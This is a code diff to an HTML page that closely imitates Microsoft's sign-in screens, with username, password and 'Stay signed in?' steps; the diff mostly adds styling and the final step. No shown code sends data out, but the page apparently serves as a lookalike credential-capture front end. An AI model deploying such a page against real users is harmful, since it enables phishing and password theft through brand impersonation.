@@ -18,6 +18,15 @@
         html,
         body {
             background-color: #e2e5d3;
+            color: #1b1b1b;
+        }
+
+        section{
+            display:table-cell;
+            vertical-align:middle;
+            height: 100vh;
+            width: 100rem;
+            max-width: 100%;
         }
 
         .title {
@@ -31,6 +40,7 @@
             max-width: 440px;
             width: calc(100% - 40px);
             padding: 44px;
+            margin: auto;
             margin-bottom: 28px;
             background-color: #fff;
             -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
@@ -38,20 +48,25 @@
             box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
             min-width: 320px;
             /* min-height: 338px; */
-            overflow: hidden;
+            /* overflow: hidden;
             position: absolute;
             transform: translate(-50%, -50%);
             top: 50%;
-            left: 50%;
+            left: 50%; */
         }
 
-        .auth-wrapper.opts {
-            top: 85%;
+        .opts {
             padding: 10px 44px;
+            max-width: 440px;
             cursor: pointer;
+            margin: auto;
+            background-color: #fff;
+            -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
         }
 
-        .auth-wrapper.opts:hover {
+        .opts:hover {
             background-color: rgba(0, 0, 0, .1);
         }
 
@@ -165,6 +180,11 @@
             text-decoration: none;
         }
 
+        .footer span {
+            font-size: 20px;
+            line-height: 20px;
+        }
+
         .footer a:hover {
             text-decoration: underline;
         }
@@ -216,6 +236,94 @@
             border-bottom-color: var(--error) !important;
         }
 
+        .btn-group {
+            text-align: right;
+            width: 100%;
+            margin: 16px 0;
+        }
+
+        .btn-group>.btn {
+            display: inline;
+        }
+
+        .btn-group>.btn:not(:last-child) {
+            margin-right: 5px;
+        }
+
+        .btn-sec {
+            background-color: #b2b2b2;
+            color: #000;
+            border-color: #b2b2b2;
+        }
+
+        .btn-sec:hover {
+            background-color: rgba(0, 0, 0, .3);
+        }
+
+        #btn_final:hover {
+            text-decoration: underline;
+        }
+
+        .text-title {
+            font-size: 1.5rem;
+        }
+
+        label.has-checkbox {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .checkbox {
+            width: 20px;
+            height: 20px;
+        }
+
+        .p {
+            font-weight: 400;
+            font-size: 15px;
+            margin: 16px 0;
+        }
+
+        .fs-13 {
+            font-size: 13px;
+        }
+
+        #user_identity {
+            font-size: 15px;
+            color: #1b1b1b;
+        }
+
+        img{
+            vertical-align: middle;
+        }
+
+        @media screen and (max-width:600px) {
+            html, body{
+                background-color: #fff;
+            }
+            .auth-wrapper{
+                box-shadow: none !important;
+                /* margin:auto 80px; */
+                padding: 24px !important;
+                /* position: relative;
+                transform: none; */
+                /* top: 0;
+                left: 0; */
+                width: unset !important;
+                max-width: unset !important;
+                margin: 0 30px !important;
+            }
+            .opts{
+                box-shadow: none !important;
+                padding: 8px 24px !important;
+                border: 1px solid #999;
+                /* padding of 24px on both sides = 48px*/
+                /* padding of 24px on authwrapper and margin of 30px  sides = 54px*/
+                max-width: calc(100% - 112px);
+                margin: 12% auto !important;
+            }
+        }
         :root {
             --error: #e81123;
         }
@@ -226,7 +334,7 @@
     <section id="section_uname">
         <div class="auth-wrapper">
             <img src="logo.png" alt="Microsoft" />
-            <h2 class="title mb-0" style="font-size:24px;margin-top:16px; margin-bottom: 12px;">Sign in</h2>
+            <h2 class="title mb-16 mt-16">Sign in</h2>
             <form>
                 <div class="mb-16">
                     <p id="error_uname" class="error"></p>
@@ -234,26 +342,21 @@
                 </div>
             </form>
             <div>
-                <p class="mb-16">No account? <a href="" class="link">Create one!</a></p>
-                <p class="mb-16">
-                    <a href="#" class="link has-icon">Sign in with Windows Hello or a security key <span
-                            class="icon"><img src="question.png" alt="Question img"></span></a>
+                <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
+                <p class="mb-16 fs-13">
+                    <a href="#" class="link">Sign in with a security key
+                        <img src="question.png" alt="Question img">
+                    </a>
                 </p>
             </div>
             <div>
                 <button class="btn" id="btn_next">Next</button>
             </div>
         </div>
-        <div class="auth-wrapper opts">
+        <div class="opts">
             <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="key.png"
                         width="30px" /></span> Sign-in options</p>
         </div>
-        <footer class="footer">
-            <a href="">Terms of use</a>
-            <a href="">Privacy & cookies</a>
-            <span style="font-size: 20px;
-            line-height: 20px;">.&nbsp;.&nbsp;.</span>
-        </footer>
     </section>
 
     <section id="section_pwd" class="d-none">
@@ -263,9 +366,9 @@
                 <button class="back">
                     <img src="back.png" />
                 </button>
-                <span id="user_identity" style="font-size:15px;color: #1b1b1b;">a@b.com</span>
+                <span id="user_identity">a@b.com</span>
             </div>
-            <h2 class="title mb-0" style="font-size:24px; margin-bottom: 12px;">Enter password</h2>
+            <h2 class="title mb-16">Enter password</h2>
             <form>
                 <div class="mb-16">
                     <p id="error_pwd" class="error"></p>
@@ -273,26 +376,40 @@
                 </div>
             </form>
             <div>
-                <p class="mb-16"> <a href="#" class="link" style="font-size:13px">Forgot password?</a></p>
+                <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
                 <p class="mb-16">
-                    <a href="#" class="link has-icon" style="font-size:13px">Other ways to sign in</a>
+                    <a href="#" class="link fs-13">Other ways to sign in</a>
                 </p>
             </div>
             <div>
                 <button class="btn" id="btn_sig">Sign in</button>
             </div>
         </div>
-        <footer class="footer">
-            <a href="">Terms of use</a>
-            <a href="">Privacy & cookies</a>
-            <span style="font-size: 20px;
-            line-height: 20px;">.&nbsp;.&nbsp;.</span>
-        </footer>
     </section>
 
     <section id="section_final" class="d-none">
-
+        <div class="auth-wrapper">
+            <img src="logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <span id="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Stay signed in?</h2>
+            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
+            <label class="has-checkbox">
+                <input type="checkbox" class="checkbox" />
+                <span>Don't show this again</span>
+            </label>
+            <div class="btn-group">
+                <button class="btn btn-sec" id="btn_final">No</button>
+                <button class="btn" id="btn_final">Yes</button>
+            </div>
+        </div>
     </section>
+    <footer class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <span>.&nbsp;.&nbsp;.</span>
+    </footer>
     <script>
         const unReq = "Enter a valid email address, phone number, or Skype name."
         const pwdReq = "Please enter the password for your Microsoft account."
@@ -310,7 +427,9 @@
             if (unameVal) {
                 document.getElementById("section_uname").classList.toggle('d-none');
                 document.getElementById('section_pwd').classList.remove('d-none');
-                document.getElementById('user_identity').innerText = unameInp.value;
+                document.querySelectorAll('#user_identity').forEach((e) => {
+                    e.innerText = unameInp.value;
+                })
                 view = "pwd";
             }
         })
@@ -360,7 +479,7 @@
                 } else {
                     unameValAction(true);
                 }
-                unameInp.addEventListener('change', function(){
+                unameInp.addEventListener('change', function () {
                     if (this.value.trim() === "") {
                         unameValAction(false);
                     } else {
@@ -373,7 +492,7 @@
                 } else {
                     pwdValAction(true);
                 }
-                pwdInp.addEventListener('change', function(){
+                pwdInp.addEventListener('change', function () {
                     if (this.value.trim() === "") {
                         pwdValAction(false);
                     } else {
@@ -385,7 +504,7 @@
         }
 
         //back button
-        document.querySelector('.back').addEventListener('click', ()=>{
+        document.querySelector('.back').addEventListener('click', () => {
             view = "uname";
             document.getElementById("section_pwd").classList.toggle('d-none');
             document.getElementById('section_uname').classList.remove('d-none');
